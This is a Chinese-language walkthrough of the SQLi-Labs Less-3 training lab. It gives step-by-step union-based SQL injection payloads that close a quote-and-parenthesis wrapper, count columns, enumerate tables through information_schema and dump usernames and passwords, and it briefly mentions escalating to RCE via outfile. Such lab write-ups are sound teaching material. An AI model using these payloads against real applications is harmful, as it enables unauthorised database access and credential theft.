SQLi-Labs Less-3

2026年9月25日 SQLi-Labs Web安全 SQL注入 单引号加括号闭合

一、题目信息

  • 题目名称：SQLi-Labs Less-3 (GET - Error based - Single quotes with twist - string)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 字符型联合注入（括号扭曲）
  • 靶场链接：http://localhost:8081/Less-3/（本地环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是单引号加括号闭合的字符型联合注入。与 Less-1 纯单引号闭合不同，Less-3 的后端 SQL 语句在变量 $id 外面多了一层括号（例如 WHERE id = ('$id')）。攻击者仅用单引号无法闭合，必须使用 ') 组合来突破包裹，并利用 --+ 注释掉多余的右括号。

2. 怎么想（破题思路）

  • 访问页面，URL 为 ?id=1，页面正常显示 Login name 和 Password。
  • 尝试输入单引号 ?id=1'，页面报错。说明存在字符型注入，但闭合方式有变。
  • 尝试使用 ?id=1') --+ 闭合单引号和括号，页面正常回显，证明闭合成功。
  • 利用 order by 判断字段数，利用 union select 确定回显位。
  • 通过 information_schema 系统表查库名、表名、列名，最后查数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录：惯性使用单引号闭合导致失败

踩坑情况：由于连续做了 Less-1 和 Less-2，惯性使用 ?id=1' order by 3 --+ 去测试，结果页面报错，无法注入。

原因分析：Less-3 的后端代码是 SELECT * FROM users WHERE id = ('$id') LIMIT 0,1;。它用括号把单引号包裹了起来。只输入单引号，SQL 变成 id = ('1'') LIMIT 0,1，多出来的单引号和括号导致语法错误。

改进方式：观察报错信息（或者通过盲测），发现需要同时闭合单引号和括号，所以 Payload 变成 ?id=1') ... --+。这也就是题目里说的“twist”（扭曲）。

详细实操步骤（逐字解析）

第一步：测试闭合点

?id=1') --+

逐字解析：' 闭合原语句中的单引号，) 闭合原语句中的右括号。--+ 注释掉原语句后面的 ) LIMIT 0,1。页面回显正常，说明闭合成功。

第二步：判断字段数（图2、图3）

?id=1') order by 3 --+   (正常，见图2)
?id=1') order by 4 --+   (报错，见图3)

逐字解析：确定当前表有 3 个字段，为后面的联合注入做准备。

第三步：确定回显位（图4）

?id=-1') union select 1,2,3 --+

逐字解析：把 id 设为 -1 让前面的查询失效，union select 合并恶意查询。页面回显 2 和 3，说明第 2 和第 3 个字段是回显位。

第四步：爆出数据库名和版本（图5）

?id=-1') union select 1,database(),version() --+

逐字解析：database() 回显 security，version() 回显 5.5.44。

第五步：爆出当前数据库的所有表名（图6）

?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

逐字解析：利用 information_schema.tables 元数据表，查当前库 security 下的表名。回显 emails,referers,uagents,users。

第六步：爆出 users 表的字段名

?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

逐字解析：查 users 表的列名。回显 id,username,password。

第七步：爆出最终账号密码（图7）

?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+

逐字解析：0x3a 是冒号的十六进制，用于分隔账号密码。from users 直接从表里查数据。最终回显 admin:admin 等账号密码。

4. 怎么迁移（跨领域联想）

  • API 接口测试：在 RESTful API 中，像 /api/v1/users/(id) 这种带括号的路由参数，如果后端没有严格校验，同样容易被类似 ') 的符号闭合，导致 SQL 注入。
  • 安全开发（SDL）：无论代码里怎么加括号、加引号，只要使用的是字符串拼接，就永远存在注入风险。正确的做法是使用预编译语句（Prepared Statement）将“数据”与“代码”彻底分离。
  • 密码学：SQL注入中 `0x3a` 这种十六进制编码绕过，类似于密码学中的进制转换。攻击者常利用进制转换绕过 WAF 的字符匹配规则。

三、名词大全与原理深度复盘

1. 字符型注入的变种（Single quotes with twist）

指后端 SQL 语句并非简单的 WHERE id = '$id'，而是包含了括号、双引号等多重包裹。攻击者必须先摸清包裹结构（通过报错信息或经验），构造闭合 Payload 才能突破。

2. 联合查询（UNION）

用于合并两个或多个 SELECT 语句的结果集。前提是前后两条语句的列数必须相同。在联合注入中，我们利用它把恶意的查询结果拼接到正常回显中。

3. information_schema 数据库

MySQL 自带的“数据库户口本”。里面保存了所有数据库名、表名、列名。对于攻击者而言，这是从“盲猜”到“精准打击”的关键跳板。

4. group_concat() 函数

MySQL 的聚合函数。将多行查询结果合并成一个字符串输出，方便在页面上一次性看到所有数据（避免因为只回显第一行而漏掉信息）。

5. 0x3a 十六进制

ASCII 码中冒号 : 的十六进制表示。在注入中用它拼接用户名和密码，能让结果清晰易读（如 `admin:admin`）。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1（字符型）的区别：Less-1 是 WHERE id = '$id'，Payload 只需加 '；Less-3 是 WHERE id = ('$id')，Payload 必须是 ') 才能闭合。
  • 与 Less-2（数字型）的区别：Less-2 不需要引号闭合，Less-3 需要引号和括号双重闭合。这展示了 Web 开发中 SQL 语句拼接的“花式操作”。

2. 这种题目的出现原因

开发者认为“加了一层括号就多了一层保障”，属于典型的安全认知误区。在 SQL 中，括号只是语法结构，它并不能阻止“数据逃逸”成为“代码”。只要用户输入被拼接，无论包裹多少层引号和括号，都能被闭合绕过。

3. 这种应用在实际中如何体现？

在真实的红蓝对抗中，SQL 注入点可能存在于任何拼接 SQL 的地方。通过 `order by` 判断列数、`union select` 爆数据是获取数据库权限的经典路径。攻击者随后会进一步利用 outfile 写入木马，从而升级为 RCE。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个上了双层锁的保险箱：

  • Less-1（单层锁）：保险箱用的是单引号做的锁，你配一把单引号的钥匙就打开了。
  • Less-2（没锁）：保险箱连门都没锁，直接输入数字就打开了。
  • Less-3（双层锁）：保险箱外面是一个圆形的铁环（括号），里面才是单引号的锁。你需要先解开铁环（`')`），再用钥匙打开锁，最后用 --+ 把多余的铁环卡住。这就是“twist”的本质——把原本闭合的代码结构打乱，插入我们的恶意指令。
